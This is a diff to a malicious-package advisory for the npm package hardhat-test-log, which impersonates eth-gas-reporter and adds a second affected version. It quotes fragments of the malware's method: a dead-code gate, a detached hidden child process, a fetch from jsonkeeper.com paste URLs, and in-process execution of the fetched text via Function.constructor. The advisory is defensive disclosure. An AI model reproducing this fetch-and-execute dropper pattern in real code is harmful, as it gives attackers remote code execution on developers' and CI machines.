@@ -1,21 +1,37 @@
 {
-  "modified": "2026-06-24T04:13:05Z",
+  "modified": "2026-06-29T07:11:13Z",
   "published": "2026-06-24T04:13:05Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-6369",
   "summary": "Malicious code in hardhat-test-log (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (c8eaf29821b0a2792ecc08837bdd52a09bee062279d6c8c83f5f15855b1098f6)\nPackage impersonates the legitimate hardhat-gas-reporter / eth-gas-reporter (README is a near-verbatim copy referencing eth-gas-reporter, but package.json name is hardhat-test-log). The exported reporter function in index.js sets `var opt = 1` and unconditionally takes the `else` branch, making the plausible Mocha-reporter implementation in the `if (!opt)` block dead code that exists only as cover. The reachable branch calls `utils.connectNet(...)` in lib/utils.js, which uses `child_process.spawn('node', [lib/syncResolve.js,...], { detached: true, stdio: ['ignore'] })` followed by `progs.unref()` to launch a detached, output-suppressed background process that survives the parent test runner. lib/syncResolve.js then performs `axios.get('https://www.jsonkeeper.com/b/NB36A', { headers: { 'x-secret-key': '_' } })`, reads `data.Cookie` from the response, and executes it via `new Function.constructor('require', result)(require)` — full remote code execution in the developer's Node process with access to `require`. jsonkeeper.com is an anonymous free JSON paste host whose content the author can mutate at any time, so any developer who installs this package and runs their Hardhat/Mocha test suite using this reporter will execute whatever JavaScript the author chooses to host there.\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (741350b4472a82c53151793b413166a5fad36af3d2d14fa1d12afba9eccb9fed)\nPackage impersonates the well-known eth-gas-reporter / hardhat-gas-reporter packages: README is titled 'eth-test-log', copies badges and contributor metadata, and package.json sets author to 'cgewecke' (the real maintainer of those projects). The advertised Mocha reporter entrypoint is a decoy. index.js exports `log` as the reporter, but the function contains `var opt = 1; if (!opt) {...legitimate reporter code... } else { gestest(); }` — the dead-code gate guarantees the else branch always runs, calling utils.connectNet. utils.connectNet (lib/utils.js) spawns `node lib/syncResolve.js` as a detached, unref'd child with stdio ignored, so the dropper persists beyond Mocha teardown and produces no CI output. lib/syncResolve.js then performs `axios.get('https://www.jsonkeeper.com/b/KBZVB', { headers: { 'x-secret-key':... } })`, extracts the `Cookie` field from the response, and executes it in-process via `new Function.constructor('require', result)(require)` — giving attacker-controlled code full Node `require` access. The fetch destination is a public paste-style host with mutable, opaque content and no integrity check, so the operator can rotate the payload at will. Installing/using this package as a Hardhat/Mocha gas reporter triggers remote code execution on the developer's or CI machine.\n",
   "affected": [
     {
       "package": {
         "ecosystem": "npm",
         "name": "hardhat-test-log"
       },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            }
+          ]
+        }
+      ],
       "versions": [
-        "1.1.0"
+        "1.1.0",
+        "1.1.2"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -62,6 +78,10 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/hardhat-test-log/v/1.1.0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/hardhat-test-log/v/1.1.2"
     }
   ],
   "credits": [
@@ -76,13 +96,33 @@
   "database_specific": {
     "malicious-packages-origins": [
       {
-        "id": "IN-MAL-2026-007420",
-        "import_time": "2026-06-24T04:54:34.025624165Z",
-        "modified_time": "2026-06-24T04:13:05Z",
-        "sha256": "c8eaf29821b0a2792ecc08837bdd52a09bee062279d6c8c83f5f15855b1098f6",
         "source": "amazon-inspector",
+        "sha256": "c8eaf29821b0a2792ecc08837bdd52a09bee062279d6c8c83f5f15855b1098f6",
+        "import_time": "2026-06-24T04:54:34.025624165Z",
+        "id": "IN-MAL-2026-007420",
+        "modified_time": "2026-06-24T04:13:05Z",
         "versions": [
           "1.1.0"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "741350b4472a82c53151793b413166a5fad36af3d2d14fa1d12afba9eccb9fed",
+        "import_time": "2026-06-29T07:09:10.865962004Z",
+        "id": "IN-MAL-2026-007763",
+        "modified_time": "2026-06-29T06:04:48Z",
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "1.1.2"
         ]
       }
     ]
